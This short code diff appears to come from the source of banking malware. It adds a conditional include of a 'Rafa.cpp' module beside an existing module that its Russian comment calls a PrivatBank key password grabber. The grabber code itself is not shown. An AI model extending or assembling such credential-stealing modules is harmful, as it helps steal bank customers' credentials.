@@ -10,8 +10,13 @@
 //************************************************************************
 
 
+#ifdef RafaH  /* модуль Rafa.h */
+	#include "Rafa.cpp"
+#endif
+
+
 // Грабер пароля ключа приватбанка
-#ifdef PrivatBankH
+#ifdef PrivatBankH /* модуль PrivatBank.h */
 	#include "PrivatBank.cpp"
 #endif
 
